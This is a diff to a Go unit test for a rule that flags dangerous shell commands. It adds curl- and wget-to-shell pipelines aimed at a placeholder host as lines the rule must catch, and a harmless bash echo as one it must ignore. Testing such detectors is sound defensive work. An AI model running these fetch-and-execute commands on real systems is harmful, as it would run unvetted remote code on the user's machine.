@@ -44,12 +44,14 @@ func TestDangerousCommand(t *testing.T) {
 		"npm install -g example-fake",
 		"npm i example-fake --global",
 		"iex (New-Object Net.WebClient)",
+		`/bin/bash -c "$(curl -fsSL https://example.invalid/install)"`,
+		`zsh -c '$(wget -qO- https://example.invalid/i)'`,
 	} {
 		if matchRule(dangerous, line) == "" {
 			t.Errorf("should match: %q", line)
 		}
 	}
-	for _, line := range []string{"curl -o file.tgz https://example.invalid", "npm install example-fake", "pnpm add -D vitest", "shell: bash"} {
+	for _, line := range []string{"curl -o file.tgz https://example.invalid", "npm install example-fake", "pnpm add -D vitest", "shell: bash", `bash -c "echo $(date)"`} {
 		if matchRule(dangerous, line) != "" {
 			t.Errorf("should not match: %q", line)
 		}
